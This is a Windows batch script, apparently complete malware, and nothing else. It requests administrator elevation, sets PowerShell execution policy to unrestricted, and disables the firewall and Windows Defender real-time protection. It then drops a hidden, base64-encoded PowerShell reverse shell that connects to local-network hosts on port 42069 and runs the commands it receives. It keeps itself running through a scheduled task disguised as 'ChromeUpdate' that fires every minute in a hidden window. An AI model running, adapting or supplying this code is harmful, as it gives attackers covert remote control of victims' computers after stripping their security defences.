@echo off
setlocal enabledelayedexpansion

:: request admin elevation
set "params=%*"
cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (  echo Set UAC = CreateObject^("Shell.Application"^) : UAC.ShellExecute "cmd.exe", "/c cd ""%~sdp0"" && %~s0 %params%", "", "runas", 1 >> "%temp%\getadmin.vbs" && "%temp%\getadmin.vbs" && exit /B )

for /f "tokens=3 delims=\" %%a in ("!cd!") do set "username=%%a"
cd /d "C:\Users\%username%\AppData\Local\Temp"

powershell -command "Set-ExecutionPolicy Unrestricted -Force"

:: disable firewall
netsh advfirewall set allprofiles state off >nul 2>&1

:: disable windefend
powershell -command "Set-MpPreference -DisableRealtimeMonitoring $true"

:: set up reverse shell
set "taskname=ChromeUpdate"
set "tasksettings=$TaskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable;"
set "file=revsh.ps1"

echo iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aWYgKG5ldHN0YXQgLWFuIHwgc2VsZWN0LXN0cmluZyAiOjQyMDY5IikgewogICAgZXhpdAp9CgokYWRkcnMgPSBAKGFycCAtYSB8IHNlbGVjdC1zdHJpbmcgZHluYW1pYyB8IGZvcmVhY2gtb2JqZWN0IHsgKCRfLmxpbmUudHJpbSgpIC1zcGxpdCAiICIpWzBdIH0pCgpmb3JlYWNoICgkYWRkciBpbiAkYWRkcnMpIHsKICAgIHBpbmcgJGFkZHIgLW4gMiAtdyA1MDAKCiAgICBpZiAoISQ/KSB7CiAgICAgICAgY29udGludWUKICAgIH0KCiAgICB0cnkgeyAKICAgICAgICAkY2xpZW50ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVENQQ2xpZW50KCRhZGRyLCA0MjA2OSkgCgogICAgICAgICRzdHJlYW0gPSAkY2xpZW50LkdldFN0cmVhbSgpIAoKICAgICAgICBbYnl0ZVtdXSAkYnVmZmVyID0gMC4uNjU1MzUgfCAlezB9IAoKICAgICAgICB3aGlsZSgoJGkgPSAkc3RyZWFtLlJlYWQoJGJ1ZmZlciwgMCwgJGJ1ZmZlci5MZW5ndGgpKSAtbmUgMCl7IAogICAgICAgICAgICAkZGF0YSA9IChOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uVGV4dC5BU0NJSUVuY29kaW5nKS5HZXRTdHJpbmcoJGJ1ZmZlciwgMCwgJGkpCgogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgJHNlbmRiYWNrID0gKGlleCAkZGF0YSAyPiYxIHwgT3V0LVN0cmluZyApICsgJ1BTICcgKyAocHdkKS5QYXRoICsgJz4gJyAKICAgICAgICAgICAgfQogICAgICAgICAgICBjYXRjaCB7CiAgICAgICAgICAgICAgICAkc2VuZGJhY2sgPSAiRXJyb3I6ICQoJF8uRXhjZXB0aW9uLk1lc3NhZ2UpYG4iCiAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgICRzZW5kYnl0ZSA9IChbdGV4dC5lbmNvZGluZ106OkFTQ0lJKS5HZXRCeXRlcygkc2VuZGJhY2spIAogICAgICAgICAgICAKICAgICAgICAgICAgJHN0cmVhbS5Xcml0ZSgkc2VuZGJ5dGUsMCwkc2VuZGJ5dGUuTGVuZ3RoKSAKICAgICAgICAgICAgJHN0cmVhbS5GbHVzaCgpIAogICAgICAgIH0KCiAgICAgICAgJGNsaWVudC5DbG9zZSgpCiAgICB9IGNhdGNoIHt9Cn0="))) > %file%
attrib +h +s +r %file% >nul 2>&1

schtasks /create /tn "%taskname%" /tr "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File \"%TEMP%\%file%\"" /sc minute /mo 1 /st 00:00:00 /f > nul 2> nul
powershell -command %tasksettings%"Set-ScheduledTask -TaskName %taskname% -Settings $TaskSettings" > nul